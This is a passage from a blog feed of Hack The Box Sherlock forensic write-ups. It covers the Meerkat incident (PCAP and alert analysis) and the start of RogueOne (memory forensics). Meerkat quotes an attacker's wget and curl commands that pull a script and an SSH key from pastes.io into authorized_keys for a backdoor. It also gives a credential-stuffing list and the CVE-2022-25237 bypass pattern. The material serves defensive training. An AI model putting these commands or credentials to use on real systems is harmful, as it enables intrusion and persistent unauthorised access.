</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">}</span>
</span></span></code></pre></div><h3 id="summary">Summary</h3>
<p>This Sherlock was tough for me to answer the Task 11, 12 questions. I get to study different kinds of Windows Event Logs specially Firewall, PowerShell, Windows Defender and System. I get to analyze what commands the TA ran, what malicious files they uploaded, what firewall rules were added and also how they tried to cover their tracks by removing certain log files. It was a fun experience.</p>
]]></description></item><item><title>HTB Sherlock Meerkat</title><link>https://hshakilst.github.io/posts/htb-sherlocks/meerkat/</link><pubDate>Wed, 12 Jun 2024 04:45:17 -0400</pubDate><guid>https://hshakilst.github.io/posts/htb-sherlocks/meerkat/</guid><description><![CDATA[<h1 id="meerkat---soc">Meerkat - SOC</h1>
<h3 id="scenario">Scenario</h3>
<p>As a fast-growing startup, Forela has been utilising a business management platform. Unfortunately, our documentation is scarce, and our administrators aren&rsquo;t the most security aware. As our new security provider we&rsquo;d like you to have a look at some PCAP and log data we have exported to confirm if we have (or have not) been compromised.</p>
<h3 id="artifacts">Artifacts</h3>
<table>
<thead>
<tr>
<th>Artifact</th>
<th>MD5 Hash</th>
<th>Password</th>
</tr>
</thead>
<tbody>
<tr>
<td>meerkat.zip</td>
<td>9b8369a0fcd7f95889c28da597951ad3</td>
<td>hacktheblue</td>
</tr>
<tr>
<td>meerkat-alerts.json</td>
<td>f9642326d526c4f5159470b1c5d89b4a</td>
<td>n/a</td>
</tr>
<tr>
<td>meerkat.pcap</td>
<td>7ac62b1e835e0850104f1fc2ecf1f002</td>
<td>n/a</td>
</tr>
</tbody>
</table>
<h3 id="tools-used">Tools Used</h3>
<ul>
<li><code>jq</code> JSON parser - Analyzing the JSON file.</li>
<li>WireShark - Analyzing the PCAP file.</li>
</ul>
<h3 id="forensic-analysis">Forensic Analysis</h3>
<p><strong>Using <code>jq</code> I quickly searched for alerts with severity level 1.</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>$ cat meerkat-alerts.json| jq &#39;.[] | select(.alert.severity==<span style="color:#bd93f9">1</span>)&#39; | less
</span></span><span style="display:flex;"><span>&lt;--snip--&gt;
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&#34;ts&#34;</span>: <span style="color:#f1fa8c">&#34;2023-01-19T15:31:31.042Z&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&#34;event_type&#34;</span>: <span style="color:#f1fa8c">&#34;alert&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&#34;src_ip&#34;</span>: <span style="color:#f1fa8c">&#34;156.146.62.213&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&#34;src_port&#34;</span>: <span style="color:#bd93f9">53196</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&#34;dest_ip&#34;</span>: <span style="color:#f1fa8c">&#34;172.31.6.44&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&#34;dest_port&#34;</span>: <span style="color:#bd93f9">8080</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&#34;vlan&#34;</span>: <span style="color:#ff79c6">null</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&#34;proto&#34;</span>: <span style="color:#f1fa8c">&#34;TCP&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&#34;app_proto&#34;</span>: <span style="color:#f1fa8c">&#34;http&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&#34;alert&#34;</span>: {
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&#34;severity&#34;</span>: <span style="color:#bd93f9">1</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&#34;signature&#34;</span>: <span style="color:#f1fa8c">&#34;ET WEB_SPECIFIC_APPS Bonitasoft Default User Login Attempt M1 (Possible Staging for CVE-2022-25237)&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&#34;category&#34;</span>: <span style="color:#f1fa8c">&#34;Attempted Administrator Privilege Gain&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&#34;action&#34;</span>: <span style="color:#f1fa8c">&#34;allowed&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&#34;signature_id&#34;</span>: <span style="color:#bd93f9">2036815</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&#34;gid&#34;</span>: <span style="color:#bd93f9">1</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&#34;rev&#34;</span>: <span style="color:#bd93f9">1</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&#34;metadata&#34;</span>: {
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">&#34;signature_severity&#34;</span>: [
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;Minor&#34;</span>
</span></span><span style="display:flex;"><span>      ],
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">&#34;former_category&#34;</span>: [
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;WEB_SPECIFIC_APPS&#34;</span>
</span></span><span style="display:flex;"><span>      ],
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">&#34;attack_target&#34;</span>: [
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;Server&#34;</span>
</span></span><span style="display:flex;"><span>      ],
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">&#34;deployment&#34;</span>: [
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;SSLDecrypt&#34;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;Perimeter&#34;</span>
</span></span><span style="display:flex;"><span>      ],
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">&#34;affected_product&#34;</span>: <span style="color:#ff79c6">null</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">&#34;created_at&#34;</span>: [
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;2022_06_03&#34;</span>
</span></span><span style="display:flex;"><span>      ],
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">&#34;performance_impact&#34;</span>: [
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;Low&#34;</span>
</span></span><span style="display:flex;"><span>      ],
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">&#34;updated_at&#34;</span>: [
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;2022_06_03&#34;</span>
</span></span><span style="display:flex;"><span>      ],
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">&#34;malware_family&#34;</span>: <span style="color:#ff79c6">null</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">&#34;tag&#34;</span>: <span style="color:#ff79c6">null</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">&#34;cve&#34;</span>: [
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;CVE_2022_25237&#34;</span>
</span></span><span style="display:flex;"><span>      ]
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  },
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&#34;flow_id&#34;</span>: <span style="color:#bd93f9">1652763046938834</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&#34;pcap_cnt&#34;</span>: <span style="color:#bd93f9">2168</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&#34;tx_id&#34;</span>: <span style="color:#bd93f9">0</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&#34;icmp_code&#34;</span>: <span style="color:#ff79c6">null</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&#34;icmp_type&#34;</span>: <span style="color:#ff79c6">null</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&#34;tunnel&#34;</span>: <span style="color:#ff79c6">null</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&#34;community_id&#34;</span>: <span style="color:#f1fa8c">&#34;1:0XAwrtog1jdopmX+yd1WRDEzMAc=&#34;</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Looks like a TA was brute forcing the default credentials for Bonitasoft to exploit the CVE-2022-25237. I confirmed the credential stuffing attack by analyzing the PCAP file.</p>
<p><strong>PCAP Analysis Using WireShark</strong>
<img src="images/20240612174728.png" alt="alt text"></p>
<p>Analyzing the PCAP file it was confirmed that the TA successfully gained access to an account with the credential <code>seb.broom@forela.co.uk:g0vernm3nt</code>. And then gained privileged access to the Web Application&rsquo;s REST API by exploiting CVE-2022-25237. After getting privileged access to the Bonita web service the TA uploaded a malicious API extension to get command execution on the web application server.
<img src="images/20240612175559.png" alt="alt text"></p>
<p>The TA successfully gained command execution on the server.
<img src="images/20240612181452.png" alt="alt text">
<img src="images/20240612181529.png" alt="alt text"></p>
<p><strong>CVE-2022-25237</strong>
According to <a href="https://nvd.nist.gov/vuln/detail/CVE-2022-25237">NIST</a>, <em>Bonita Web 2021.2 is affected by a authentication/authorization bypass vulnerability due to an overly broad exclude pattern used in the RestAPIAuthorizationFilter. By appending ;i18ntranslation or /../i18ntranslation/ to the end of a URL, users with no privileges can access privileged API endpoints. This can lead to remote code execution by abusing the privileged API actions.</em></p>
<p>HTTP Object Extraction:
<img src="images/20240612180604.png" alt="alt text"></p>
<p>After discovering this incident I extracted all the HTTP TCP stream objects from the PCAP file and found the usernames and passwords combination list used in this security incident.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>user,password
</span></span><span style="display:flex;"><span>Clerc.Killich%40forela.co.uk,vYdwoVhGIwJ
</span></span><span style="display:flex;"><span>Lauren.Pirozzi%40forela.co.uk,wsp0Uy
</span></span><span style="display:flex;"><span>Merna.Rammell%40forela.co.uk,u7pWoF36fn
</span></span><span style="display:flex;"><span>Gianina.Tampling%40forela.co.uk,maUIffqQl
</span></span><span style="display:flex;"><span>Konstance.Domaschke%40forela.co.uk,6XLZjvD
</span></span><span style="display:flex;"><span>Vida.Murty%40forela.co.uk,4ulecG
</span></span><span style="display:flex;"><span>Elka.Cavet%40forela.co.uk,n1aSdc
</span></span><span style="display:flex;"><span>Noam.Harvett%40forela.co.uk,VDt8bh
</span></span><span style="display:flex;"><span>Norbie.Bartolini%40forela.co.uk,GV2zlop
</span></span><span style="display:flex;"><span>Cariotta.Whife%40forela.co.uk,x3hoU0
</span></span><span style="display:flex;"><span>Mella.Amsberger%40forela.co.uk,4nIYM5WqN
</span></span><span style="display:flex;"><span>Cyndy.Element%40forela.co.uk,ybWxct
</span></span><span style="display:flex;"><span>Imelda.Braben%40forela.co.uk,dC7bjGLYB
</span></span><span style="display:flex;"><span>Marven.Samuel%40forela.co.uk,LPU0qQnt108
</span></span><span style="display:flex;"><span>Osborne.Humpatch%40forela.co.uk,OJ4WHcI4D
</span></span><span style="display:flex;"><span>Talya.Sterman%40forela.co.uk,3gCERZ2JMh
</span></span><span style="display:flex;"><span>Drusilla.Nice%40forela.co.uk,l35Euh0T3Am
</span></span><span style="display:flex;"><span>Tobiah.Horstead%40forela.co.uk,fp0OQl
</span></span><span style="display:flex;"><span>Kayley.Northway%40forela.co.uk,s9MC7mkdVU
</span></span><span style="display:flex;"><span>Adora.Mersh%40forela.co.uk,85Hh8JZkJR6
</span></span><span style="display:flex;"><span>Guss.Botten%40forela.co.uk,sVMRgGmv0sE
</span></span><span style="display:flex;"><span>Cordelie.Rostron%40forela.co.uk,mAtdcJh
</span></span><span style="display:flex;"><span>Ellerey.Bierling%40forela.co.uk,Nva0nKTz
</span></span><span style="display:flex;"><span>Berny.Ferrarin%40forela.co.uk,lPCO6Z
</span></span><span style="display:flex;"><span>Nefen.Heffernon%40forela.co.uk,VR0ZA8
</span></span><span style="display:flex;"><span>Skipton.Pickerill%40forela.co.uk,lcsui1Nu
</span></span><span style="display:flex;"><span>Nola.Crichmer%40forela.co.uk,QGa58W3L
</span></span><span style="display:flex;"><span>Sharon.Claus%40forela.co.uk,3X4d06I
</span></span><span style="display:flex;"><span>Bernelle.Draycott%40forela.co.uk,MmxlUAWe0oW
</span></span><span style="display:flex;"><span>Samaria.Percifull%40forela.co.uk,CUgc3hzHw5g
</span></span><span style="display:flex;"><span>Puff.Yapp%40forela.co.uk,M08Aae
</span></span><span style="display:flex;"><span>Cynthia.Hatto%40forela.co.uk,z0NXI6
</span></span><span style="display:flex;"><span>seb.broom%40forela.co.uk,g0vernm3nt
</span></span><span style="display:flex;"><span>Alexi.Siman%40forela.co.uk,iUS11pX
</span></span><span style="display:flex;"><span>Pete.Panons%40forela.co.uk,BKdkGTB
</span></span><span style="display:flex;"><span>Rakel.Cawley%40forela.co.uk,h4gW3YLwnW9t
</span></span><span style="display:flex;"><span>Merl.Lavalde%40forela.co.uk,BgfiOVXNLBc
</span></span><span style="display:flex;"><span>Antoinette.Vittel%40forela.co.uk,bGtHL8cg
</span></span><span style="display:flex;"><span>Stanleigh.Tuckwell%40forela.co.uk,VQCk8TGn3
</span></span><span style="display:flex;"><span>Denny.Gepson%40forela.co.uk,q2JqCSXk69
</span></span><span style="display:flex;"><span>Aline.Rivallant%40forela.co.uk,gFixyf1nGgf
</span></span><span style="display:flex;"><span>Jordain.Eykel%40forela.co.uk,rnMXBNdNW0
</span></span><span style="display:flex;"><span>Gypsy.Henric%40forela.co.uk,lLPqVgmHs5F
</span></span><span style="display:flex;"><span>Adrea.Shervil%40forela.co.uk,7YoFhtUq
</span></span><span style="display:flex;"><span>Jenilee.Pressman%40forela.co.uk,3eYwLOKhQEcl
</span></span><span style="display:flex;"><span>Fredrick.Gerraty%40forela.co.uk,W1By0HUByDHO
</span></span><span style="display:flex;"><span>Ebony.Oleszcuk%40forela.co.uk,uAWnyfKOjQM
</span></span><span style="display:flex;"><span>Garrard.Colisbe%40forela.co.uk,jMi9iP
</span></span><span style="display:flex;"><span>Farleigh.Schouthede%40forela.co.uk,JzI6Dvhy
</span></span><span style="display:flex;"><span>Ahmed.Monteaux%40forela.co.uk,6uskrtw8U
</span></span><span style="display:flex;"><span>Griffith.Lumm%40forela.co.uk,QPepd0M8wBK
</span></span><span style="display:flex;"><span>Winston.Conville%40forela.co.uk,cEmh5W2Vh
</span></span><span style="display:flex;"><span>Pat.Kloisner%40forela.co.uk,N8ZwVMzF6
</span></span><span style="display:flex;"><span>Teresita.Benford%40forela.co.uk,uvYjtQzX
</span></span><span style="display:flex;"><span>Mathian.Skidmore%40forela.co.uk,TQSNp6XrK
</span></span><span style="display:flex;"><span>Gerri.Cordy%40forela.co.uk,w15pvWGTK
</span></span></code></pre></div><p>I also found an interesting file named <code>bx5gcr0et8</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{<span style="color:#ff79c6">&#34;p&#34;</span>:<span style="color:#f1fa8c">&#34;0&#34;</span>,<span style="color:#ff79c6">&#34;c&#34;</span>:<span style="color:#f1fa8c">&#34;1&#34;</span>,<span style="color:#ff79c6">&#34;cmd&#34;</span>:<span style="color:#f1fa8c">&#34;wget https://pastes.io/raw/bx5gcr0et8&#34;</span>,<span style="color:#ff79c6">&#34;out&#34;</span>:<span style="color:#f1fa8c">&#34;--2023-01-19 15:38:52--  https://pastes.io/raw/bx5gcr0et8\nResolving pastes.io (pastes.io)... 66.29.132.145\nConnecting to pastes.io (pastes.io)|66.29.132.145|:443... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 113 [text/plain]\nSaving to: \u2018bx5gcr0et8\u2019\n\n     0K                                                       100% 57.8M=0s\n\n2023-01-19 15:38:53 (57.8 MB/s) - \u2018bx5gcr0et8\u2019 saved [113/113]\n\n&#34;</span>,<span style="color:#ff79c6">&#34;currentDate&#34;</span>:<span style="color:#f1fa8c">&#34;2023-01-19&#34;</span>}
</span></span></code></pre></div><p>A command was issued to download the file from <code>pastes.io</code>.
<img src="images/20240612181638.png" alt="alt text"></p>
<p>And then another command was issued to run the <code>bx5gcr0et8</code> file which was a bash script.
<img src="images/20240612181813.png" alt="alt text"></p>
<p>The contents of the bash script <code>bx5gcr0et8</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>**#!/bin/bash
</span></span><span style="display:flex;"><span>curl https://pastes.io/raw/hffgra4unv &gt;&gt; /home/ubuntu/.ssh/authorized_keys
</span></span><span style="display:flex;"><span>sudo service ssh restart**
</span></span></code></pre></div><p>A persistence technique identified by MITRE with a technique ID <a href="https://attack.mitre.org/techniques/T1098/004/">T1098.004</a>. Basically, the adversary used a public key and inserted in into the <code>/home/ubuntu/.ssh/authorized_keys</code> file. In this technique the TA can also set the derivative <code>PubkeyAuthentication</code> set to <code>yes</code> in the <code>/etc/ssh/sshd_config</code> file. And, also can modify the <code>sshd_config</code> file further and set the <code>RSAAuthentication</code> to the value <code>yes</code>, if the public key algorithm is RSA based.</p>
<p>The Public Key used by the TA:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCgruRMq3DMroGXrcPeeuEqQq3iS/sAL3gryt+nUqbBA/M+KG4ElCvJS4gP2os1b8FMk3ZwvrVTdpEKW6wdGqPl2wxznBjOBstx6OF2yp9RIOb3c/ezgs9zvnaO07YC8Sm4nkkXHgkabqcM7rHEY4Lay0LWF9UbxueSAHIJgQ2ADbKSnlg0gMnJTNRwKbqesk0ZcG3b6icj6nkKykezBLvWc7z4mkSm28ZVTa15W3HUWSEWRbGgJ6eMBdi7WnWXZ92SYDq0XUBV2Sx2gjoDGHwcd6I0q9BU52wWYo3L3LaPEoTcLuA+hnn82086oUzJfmEUtWGlPAXfJBN7vRIMSvsN
</span></span></code></pre></div><h3 id="summary">Summary</h3>
<p>The threat actors used credential stuffing attack against the Bonita Service and escalated their privileges in the web application by exploiting CVE-2022-25237. After that to get remote code execution on the server the threat actors uploaded a malicious extension file which gave them command injection ability. Then, they used this ability to get information of the users and added a SSH backdoor to the <code>ubuntu</code> user account for persistence.</p>
]]></description></item><item><title>HTB Sherlock RogueOne</title><link>https://hshakilst.github.io/posts/htb-sherlocks/rogueone/</link><pubDate>Tue, 11 Jun 2024 15:18:00 +0000</pubDate><guid>https://hshakilst.github.io/posts/htb-sherlocks/rogueone/</guid><description><![CDATA[<h1 id="rogueone---dfir">RogueOne - DFIR</h1>
<h3 id="scenario">Scenario</h3>
<p>Your SIEM system generated multiple alerts in less than a minute, indicating potential C2 communication from Simon Stark&rsquo;s workstation. Despite Simon not noticing anything unusual, the IT team had him share screenshots of his task manager to check for any unusual processes. No suspicious processes were found, yet alerts about C2 communications persisted. The SOC manager then directed the immediate containment of the workstation and a memory dump for analysis. As a memory forensics expert, you are tasked with assisting the SOC team at Forela to investigate and resolve this urgent incident.</p>
<h3 id="artifacts">Artifacts</h3>
<table>
<thead>
<tr>
<th>Artifact</th>
<th>MD5 Hash</th>
<th>Password</th>
</tr>
</thead>
<tbody>
<tr>
<td>RogueOne.zip</td>
<td>5810aa928e827d5ab8373aa4e1107572</td>
<td>hacktheblue</td>
</tr>
<tr>
<td>220230810.mem</td>
<td>d34ed786f888c1da061399df6cbe9d7b</td>
<td>n/a</td>
</tr>
</tbody>
</table>
<h3 id="tools">Tools</h3>
<ul>
<li>Volatility</li>
</ul>
<h3 id="analysis">Analysis</h3>
<p>Memory Dump Information</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ vol3 -f 20230810.mem windows.info
</span></span><span style="display:flex;"><span>Volatility <span style="color:#bd93f9">3</span> Framework 2.7.1
</span></span><span style="display:flex;"><span>Progress:  100.00		PDB scanning finished                                                                                              
</span></span><span style="display:flex;"><span>Variable	Value
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Kernel Base	0xf80178400000
</span></span><span style="display:flex;"><span>DTB	0x16a000
</span></span><span style="display:flex;"><span>Symbols	file:///opt/volatility3/volatility3/symbols/windows/ntkrnlmp.pdb/3789767E34B7A48A3FC80CE12DE18E65-1.json.xz
</span></span><span style="display:flex;"><span>Is64Bit	True
</span></span><span style="display:flex;"><span>IsPAE	False
</span></span><span style="display:flex;"><span>layer_name	<span style="color:#bd93f9">0</span> WindowsIntel32e
</span></span><span style="display:flex;"><span>memory_layer	<span style="color:#bd93f9">1</span> FileLayer
</span></span><span style="display:flex;"><span>KdVersionBlock	0xf8017900f398
</span></span><span style="display:flex;"><span>Major/Minor	15.19041
</span></span><span style="display:flex;"><span>MachineType	<span style="color:#bd93f9">34404</span>
</span></span><span style="display:flex;"><span>KeNumberProcessors	<span style="color:#bd93f9">8</span>
</span></span><span style="display:flex;"><span>SystemTime	2023-08-10 11:32:00
</span></span><span style="display:flex;"><span>NtSystemRoot	C:<span style="color:#f1fa8c">\W</span>INDOWS
</span></span><span style="display:flex;"><span>NtProductType	NtProductWinNt
</span></span><span style="display:flex;"><span>NtMajorVersion	<span style="color:#bd93f9">10</span>
</span></span><span style="display:flex;"><span>NtMinorVersion	<span style="color:#bd93f9">0</span>
</span></span><span style="display:flex;"><span>PE MajorOperatingSystemVersion	<span style="color:#bd93f9">10</span>
</span></span><span style="display:flex;"><span>PE MinorOperatingSystemVersion	<span style="color:#bd93f9">0</span>
</span></span><span style="display:flex;"><span>PE Machine	<span style="color:#bd93f9">34404</span>
</span></span><span style="display:flex;"><span>PE TimeDateStamp	Mon Nov <span style="color:#bd93f9">24</span> 23:45:00 <span style="color:#bd93f9">2070</span>
</span></span></code></pre></div><p><strong>Profile Identification</strong>
We are dealing with Windows 10.0 Build 19041 and x64 architecture.</p>
<p><strong>Malicious Process Identification</strong></p>
<p>Process Information</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ vol3 -f 20230810.mem windows.psscan
</span></span><span style="display:flex;"><span>Volatility <span style="color:#bd93f9">3</span> Framework 2.7.1
</span></span><span style="display:flex;"><span>Progress:  100.00		PDB scanning finished                        
</span></span><span style="display:flex;"><span>PID	PPID	ImageFileName	Offset<span style="color:#ff79c6">(</span>V<span style="color:#ff79c6">)</span>	Threads	Handles	SessionId	Wow64	CreateTime	ExitTime	File output
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>4876	788	svchost.exe	0x9d80001bd1c0	4	-	0	False	2023-08-10 11:13:45.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>4	0	System	0x9e8b87680040	225	-	N/A	False	2023-08-10 11:13:38.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>140	4	Registry	0x9e8b876ce080	4	-	N/A	False	2023-08-10 11:13:32.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>2240	928	ShellExperienc	0x9e8b8775c080	11	-	1	False	2023-08-10 11:27:30.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>6812	7436	svchost.exe	0x9e8b87762080	3	-	1	False	2023-08-10 11:30:03.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>564	548	csrss.exe	0x9e8b882f8140	13	-	0	False	2023-08-10 11:13:41.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>436	4	smss.exe	0x9e8b8843f040	2	-	N/A	False	2023-08-10 11:13:38.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>644	636	csrss.exe	0x9e8b893eb140	14	-	1	False	2023-08-10 11:13:41.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>656	548	wininit.exe	0x9e8b89416080	1	-	0	False	2023-08-10 11:13:41.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>744	636	winlogon.exe	0x9e8b89441080	4	-	1	False	2023-08-10 11:13:42.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>4744	788	svchost.exe	0x9e8b8946d1c0	1	-	0	False	2023-08-10 11:13:45.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>788	656	services.exe	0x9e8b8949e080	10	-	0	False	2023-08-10 11:13:42.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>808	656	lsass.exe	0x9e8b894a2080	12	-	0	False	2023-08-10 11:13:42.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>928	788	svchost.exe	0x9e8b89527240	13	-	0	False	2023-08-10 11:13:42.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>964	656	fontdrvhost.ex	0x9e8b8952e180	5	-	0	False	2023-08-10 11:13:43.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>956	744	fontdrvhost.ex	0x9e8b89530180	5	-	1	False	2023-08-10 11:13:43.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>512	788	svchost.exe	0x9e8b895a72c0	11	-	0	False	2023-08-10 11:13:43.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>864	788	svchost.exe	0x9e8b895a9240	6	-	0	False	2023-08-10 11:13:43.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>7756	928	RuntimeBroker.	0x9e8b89c39080	4	-	1	False	2023-08-10 11:14:16.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>1048	744	dwm.exe	0x9e8b89c520c0	14	-	1	False	2023-08-10 11:13:43.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>1148	788	svchost.exe	0x9e8b89c922c0	30	-	0	False	2023-08-10 11:13:43.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>1272	788	svchost.exe	0x9e8b89cf4280	3	-	0	False	2023-08-10 11:13:43.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>1280	788	svchost.exe	0x9e8b89cf5080	4	-	0	False	2023-08-10 11:13:43.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>1288	788	svchost.exe	0x9e8b89cf71c0	3	-	0	False	2023-08-10 11:13:43.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>1296	788	svchost.exe	0x9e8b89cf91c0	4	-	0	False	2023-08-10 11:13:43.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>1304	788	svchost.exe	0x9e8b89cfb200	4	-	0	False	2023-08-10 11:13:43.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>1432	788	svchost.exe	0x9e8b89d121c0	5	-	0	False	2023-08-10 11:13:43.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>1472	788	svchost.exe	0x9e8b89d3e1c0	7	-	0	False	2023-08-10 11:13:43.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>1500	788	svchost.exe	0x9e8b89d412c0	10	-	0	False	2023-08-10 11:13:43.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>1580	788	svchost.exe	0x9e8b89d900c0	7	-	0	False	2023-08-10 11:13:43.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>8224	928	SearchApp.exe	0x9e8b89d92080	55	-	1	False	2023-08-10 11:14:14.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>1588	788	svchost.exe	0x9e8b89d94080	6	-	0	False	2023-08-10 11:13:43.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>1712	788	svchost.exe	0x9e8b89dab1c0	2	-	0	False	2023-08-10 11:13:43.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>5056	1580	MicrosoftEdgeU	0x9e8b89e21080	0	-	0	False	2023-08-10 11:20:44.000000 	2023-08-10 11:29:13.000000 	Disabled
</span></span><span style="display:flex;"><span>1748	788	svchost.exe	0x9e8b89e541c0	11	-	0	False	2023-08-10 11:13:43.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>1756	788	svchost.exe	0x9e8b89e562c0	6	-	0	False	2023-08-10 11:13:43.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>1828	788	svchost.exe	0x9e8b89e70240	6	-	0	False	2023-08-10 11:13:43.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>9204	4364	conhost.exe	0x9e8b89ec7080	3	-	1	False	2023-08-10 11:30:57.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>2140	788	svchost.exe	0x9e8b89f6f200	2	-	0	False	2023-08-10 11:13:44.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>1980	788	svchost.exe	0x9e8b89fbc240	3	-	0	False	2023-08-10 11:13:43.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>1988	788	svchost.exe	0x9e8b89fc1280	6	-	0	False	2023-08-10 11:13:43.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>2044	788	svchost.exe	0x9e8b89fc2080	8	-	0	False	2023-08-10 11:13:43.000000 	N/A	Disabled
